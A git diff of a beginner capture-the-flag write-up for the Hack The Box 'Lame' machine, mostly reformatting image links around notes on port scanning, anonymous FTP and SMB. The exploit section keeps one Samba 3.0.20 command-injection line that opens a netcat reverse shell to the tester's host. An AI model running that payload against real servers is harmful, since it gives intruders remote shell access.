@@ -11,17 +11,27 @@ Lame box is an easy challenge suitable for beginners. It involves discovering op
 ## nmap
 
 Discovered some open ports.
-![[Lame_image_1.png]]
+
+![nmap](/assets/lame/Lame_image_1.png)
+
 Scan ports 21 (FTP), 22 (SSH), 139 (NetBIOS), 445 (SMB), and 3632, perform version detection and default script scanning.
-![[Lame_image_2.png]]
+
+![svc scan](/assets/lame/Lame_image_2.png)
+
 ## FTP - TCP 21
 Anonymous login but empty.
-![[Pasted image 20240623021419.png]]
+
+![anonymous login](/assets/lame/anonlogin.png)
+
 ## SMB - TCP 445
 One accessible share.
-![[Lame_image_3.png]]
+
+![shares](/assets/lame/Lame_image_3.png)
+
 Nothing Important
-![[Pasted image 20240623021705.png]]
+
+![nada](/assets/lame/Lame4.png)
+
 
 # Exploit
 Samba 3.0.20-Debian is vulnerable to RCE.
@@ -37,5 +47,6 @@ logon "/=`nc 10.10.14.151 1337 -e /bin/sh`"
 ```
 
 Root
-![[tmp1719122533136_Lame_image_1.png]]
+
+![root](/assets/lame/tmp1719122533136_Lame_image_1.png)
 
